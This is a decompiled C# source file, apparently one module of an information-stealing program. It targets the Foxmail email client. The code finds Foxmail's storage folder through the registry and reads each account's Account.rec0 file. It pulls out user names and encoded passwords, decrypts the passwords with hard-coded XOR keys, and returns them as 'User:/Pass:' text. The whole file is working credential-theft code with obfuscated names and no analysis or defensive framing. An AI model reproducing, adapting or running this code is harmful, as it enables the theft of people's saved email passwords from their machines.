using System;
using System.IO;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

[StandardModule]
public sealed class GClass0
{
	public static object smethod_0()
	{
		string text = string.Empty;
		object result = null;
		try
		{
			object obj;
			object obj2 = (obj = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Classes\\Foxmail.url.mailto\\Shell\\open\\command")!.GetValue("")!.ToString());
			Type type = null;
			string text2 = "Remove";
			object[] array = new object[1];
			object[] array2 = array;
			object obj3 = obj2;
			object obj4 = obj3;
			Type type2 = null;
			string text3 = "LastIndexOf";
			object[] array3 = new object[1];
			string text4 = (string)(array3[0] = "Foxmail.exe");
			array2[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, type2, text3, array3, (string[])null, (Type[])null, (bool[])null));
			object[] array4 = array;
			object[] array5 = array4;
			string[] array6 = null;
			Type[] array7 = null;
			bool[] array8 = new bool[1] { true };
			object obj5 = NewLateBinding.LateGet(obj, type, text2, array5, array6, array7, array8);
			if (array8[0])
			{
				NewLateBinding.LateSetComplex(obj3, (Type)null, "LastIndexOf", new object[2]
				{
					text4,
					RuntimeHelpers.GetObjectValue(array4[0])
				}, (string[])null, (Type[])null, true, false);
			}
			string[] directories = Directory.GetDirectories(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(obj5, (Type)null, "Replace", new object[2] { "\"", "" }, (string[])null, (Type[])null, (bool[])null), (object)"Storage\\")), "*@*", SearchOption.TopDirectoryOnly);
			foreach (string text5 in directories)
			{
				try
				{
					string text6 = text5.Substring(text5.LastIndexOf("\\") + 1);
					object obj6 = new FileStream(text5 + "\\Accounts\\Account.rec0", FileMode.Open);
					object obj7 = Conversions.ToInteger(NewLateBinding.LateGet(obj6, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null));
					object obj8 = new byte[Conversions.ToInteger(Operators.SubtractObject(obj7, (object)1)) + 1];
					bool flag = false;
					string text7 = "";
					object obj9 = obj6;
					Type type3 = null;
					string text8 = "Read";
					object[] array9 = new object[3]
					{
						RuntimeHelpers.GetObjectValue(obj8),
						0,
						RuntimeHelpers.GetObjectValue(obj7)
					};
					object[] array10 = array9;
					string[] array11 = null;
					Type[] array12 = null;
					array8 = new bool[3] { true, false, true };
					NewLateBinding.LateCall(obj9, type3, text8, array10, array11, array12, array8, true);
					if (array8[0])
					{
						obj8 = RuntimeHelpers.GetObjectValue(array9[0]);
					}
					if (array8[2])
					{
						obj7 = RuntimeHelpers.GetObjectValue(array9[2]);
					}
					int num = ((!Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet(obj8, new object[1] { 0 }, (string[])null), (object)208, false)) ? 1 : 0);
					int num2 = Conversions.ToInteger(Operators.SubtractObject(obj7, (object)1));
					for (int j = 0; j <= num2; j++)
					{
						if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateIndexGet(obj8, new object[1] { j }, (string[])null), (object)32, false) && Operators.ConditionalCompareObjectLess(NewLateBinding.LateIndexGet(obj8, new object[1] { j }, (string[])null), (object)127, false) && Operators.ConditionalCompareObjectNotEqual(NewLateBinding.LateIndexGet(obj8, new object[1] { j }, (string[])null), (object)61, false))
						{
							text7 += Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet(obj8, new object[1] { j }, (string[])null))));
							string text9 = "";
							if (!text7.Equals("Account") && !text7.Equals("POP3Account"))
							{
								if (flag && (text7.Equals("Password") || text7.Equals("POP3Password")))
								{
									int num3 = j + 9;
									if (num == 0)
									{
										num3 = j + 2;
									}
									string text10 = "";
									while (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateIndexGet(obj8, new object[1] { num3 }, (string[])null), (object)32, false) && Operators.ConditionalCompareObjectLess(NewLateBinding.LateIndexGet(obj8, new object[1] { num3 }, (string[])null), (object)127, false))
									{
										text10 += Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet(obj8, new object[1] { num3 }, (string[])null))));
										num3++;
									}
									if (Operators.CompareString(text, string.Empty, false) == 0)
									{
										text += "Foxmail:\r\n";
									}
									text = text + "User:" + text6 + "\r\n";
									text = text + "Pass:" + smethod_1(num, text10) + "\r\n\r\n";
									NewLateBinding.LateCall(obj6, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
									break;
								}
							}
							else
							{
								int num4 = j + 9;
								if (num == 0)
								{
									num4 = j + 2;
								}
								while (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateIndexGet(obj8, new object[1] { num4 }, (string[])null), (object)32, false) && Operators.ConditionalCompareObjectLess(NewLateBinding.LateIndexGet(obj8, new object[1] { num4 }, (string[])null), (object)127, false))
								{
									text9 += Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet(obj8, new object[1] { num4 }, (string[])null))));
									num4++;
								}
								flag = true;
								j = num4;
							}
						}
						else
						{
							text7 = "";
						}
					}
				}
				catch (Exception)
				{
				}
			}
			if (Operators.CompareString(text, string.Empty, false) != 0)
			{
				text += "\r\n";
			}
			result = text;
			return result;
		}
		catch (Exception)
		{
			return result;
		}
	}

	public static string smethod_1(int v, string pHash)
	{
		string text = "";
		int[] array = new int[8] { 126, 100, 114, 97, 71, 111, 120, 126 };
		int[] array2 = new int[8] { 126, 70, 64, 55, 37, 109, 36, 126 };
		int num = Convert.ToInt32("5A", 16);
		if (v == 1)
		{
			array = array2;
			num = Convert.ToInt32("71", 16);
		}
		int num2 = (int)Math.Round((double)pHash.Length / 2.0);
		int num3 = 0;
		int[] array3 = new int[num2 - 1 + 1];
		int num4 = num2 - 2;
		for (int i = 0; i <= num4; i++)
		{
			array3[i] = Convert.ToInt32(pHash.Substring(num3, 2), 16);
			num3 += 2;
		}
		int[] array4 = new int[array3.Length - 1 + 1];
		array4[0] = array3[0] ^ num;
		Array.Copy(array3, 1, array4, 1, array3.Length - 1);
		while (array3.Length > array.Length)
		{
			int[] array5 = new int[array.Length * 2 - 1 + 1];
			Array.Copy(array, 0, array5, 0, array.Length);
			Array.Copy(array, 0, array5, array.Length, array.Length);
			array = array5;
		}
		int[] array6 = new int[array3.Length - 1 + 1];
		int num5 = array3.Length - 1;
		for (int j = 1; j <= num5; j++)
		{
			array6[j - 1] = array3[j] ^ array[j - 1];
		}
		int[] array7 = new int[array6.Length - 1 + 1];
		int num6 = array6.Length - 1 - 1;
		for (int k = 0; k <= num6; k++)
		{
			if (array6[k] - array4[k] < 0)
			{
				array7[k] = array6[k] + 255 - array4[k];
			}
			else
			{
				array7[k] = array6[k] - array4[k];
			}
			text += Conversions.ToString(Strings.ChrW(array7[k]));
		}
		return text;
	}
}
